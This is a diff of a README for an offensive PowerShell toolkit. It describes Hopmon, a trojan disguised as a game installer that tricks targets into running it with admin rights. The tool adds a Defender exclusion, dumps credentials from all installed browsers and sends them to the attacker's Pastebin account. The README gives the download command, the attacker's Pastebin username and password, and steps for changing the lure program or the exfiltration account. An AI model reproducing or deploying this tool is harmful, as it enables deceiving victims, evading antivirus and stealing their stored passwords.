@@ -235,7 +235,7 @@ Warning: Invoke-Exclusions will 'NOT' delete itself or mspass.exe (deliver by -U
    
 |Binary Name|Description|Privileges|Notes|
 |---|---|---|---|
-|[Hopmon.PS1](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Dump-Browser/Hopmon.ps1)|Install Hopmon game (social engineering) + dumps browsers credentials|Administrator|send credentials to pastebin|
+|[Hopmon.PS1](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Dump-Browser/Hopmon.ps1)|Install Hopmon game (social engineering) + dumps browsers credentials<br />Browsers supported:  Chromium, Chrome, Firefox, MEdge, Safari, Opera|Administrator|send credentials to pastebin|
 
 <br />
 
@@ -245,9 +245,7 @@ then dumps all browsers credentials stored (silent execution) from memory and se
 to the website: https://pastebin.com/u/pedro_testing where we can review the credentials.<br />
 
 This project contains <b><i>Hopmon.exe Hopmon.ps1</i></b> and <b><i>Hopmon.vbs</i></b> but we<br />
-only need to send <b><i>Hopmon.exe</i></b> to target user and convince him to execute it.<br />
-
-<br />
+only need to send <b><i>Hopmon.exe</i></b> to target user and convince him to execute it.<br /><br />
 
 - Hopmon.exe execution flow
   * It asks for administrator privileges to run (UAC)
@@ -260,14 +258,14 @@ only need to send <b><i>Hopmon.exe</i></b> to target user and convince him to ex
   * Creates %TMP% directory exclusion in windows Defender
   * Dumps credentials from all installed browsers (%TEMP%)
   * Sends credentials dump to our account in PasteBin.com
-  * It deletes itself ([Hopmon.PS1](https://github.com/r00t-3xp10it/redpill/blob/main/lib/Dump-Browser/Hopmon.ps1)) in the end of execution
+  * It deletes itself (Hopmon.PS1) in the end of execution
 
 <br />
 
 **prerequesites checks:**
 ```powershell
 #Make sure WinGet its installed (default)
-If((Winget -v) -match '^(v.)'){echo "WinGet Installed"}Else{echo "WinGet missing"}
+Winget -v
 
 #Make sure required modules are present\loaded
 [bool]((Get-Module -ListAvailable -Name "ConfigDefender").ExportedCommands|findstr /C:"Set-MpPreference")
@@ -280,36 +278,40 @@ If((Winget -v) -match '^(v.)'){echo "WinGet Installed"}Else{echo "WinGet missing
 iwr -uri "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/lib/Dump-Browser/Hopmon.rar" -OutFile "Hopmon.rar"
 ```
 
-<br />
+<br /><br />
 
-**Final Notes**
+**Access pastebin to review credentials dump:**
 ```
-ACCESS-PASTEBIN-TO-REVIEW-CREDENTIALS-DUMP:
-  * The attacker needs to access URL : https://pastebin.com/u/pedro_testing
-  * The attacker needs to login with username : pedro_testing
-  * The attacker needs to login with password : angelapastebin
-   - [The attacker can now review the contents of logfiles] -
+1 - The attacker needs to access URL : https://pastebin.com/u/pedro_testing
+2 - The attacker needs to login with username : pedro_testing
+3 - The attacker needs to login with password : angelapastebin
 
-WHAT-CAN-GO-WRONG?
-  * The target did not execute Hopmon.exe with admin
-    privileges when the EXE program asks for UAC access (admin)
-  * The target as a diferent anti-virus instaled besides windows defender (default)
-    and the probability of this scripts bypass other anti-virus detection its smaller.
-  * The target uses a web browser not supported by this project so it can not dump is credentials
-   Browsers supported are: Chromium, Chrome, Firefox, IE, MEdge, Safari, Opera
-
-How to install a diferent game\program ?
-  a) Edit Hopmon.vbs script
-  b) Search inside the file for '-file Hopmon.ps1'
-  c) Replace '-file Hopmon.ps1' by '-file Hopmon.ps1 -Program Sunshine'
-  d) Send Hopmon.vbs (or compile to EXE) to target for manual execution.
-
-How to list WinGet (microsoft store) games available ?
-  Winget search games
-
-How to use a diferent pastebin account ?
-  a) Edit Hopmon.vbs script
-  b) Search inside the file for '-file Hopmon.ps1'
-  c) Replace '-file Hopmon.ps1' by '-file Hopmon.ps1 -PasteBinUserName r00t-3xp10it -PasteBinPassword angela -PastebinDeveloperKey 1ab4a1a4e39c94db4'
-  d) Send Hopmon.vbs (or compile to EXE) to target for manual execution.
+- The attacker can now review all credentials captured ( logfiles )
 ```
+
+<br /><br />
+
+**How to install a diferent game\program ?**
+```
+1 - Edit Hopmon.vbs script
+2 - Search inside the file for '-file Hopmon.ps1'
+3 - Replace '-file Hopmon.ps1' by '-file Hopmon.ps1 -Program Sunshine'
+4 - Send Hopmon.vbs (or compile to EXE) to target for manual execution.
+```
+
+**How to list WinGet (microsoft store) games available ?**
+```powershell
+Winget search games
+```
+
+
+<br /><br />
+
+**How to use a diferent pastebin account ?**
+```
+1 - Edit Hopmon.vbs script
+2 - Search inside the file for '-file Hopmon.ps1'
+3 - Replace '-file Hopmon.ps1' by '-file Hopmon.ps1 -PasteBinUserName r00t -PasteBinPassword angela -PastebinDeveloperKey 1ab4e39c94db4'
+4 - Send Hopmon.vbs (or compile to EXE) to target for manual execution.
+```
+
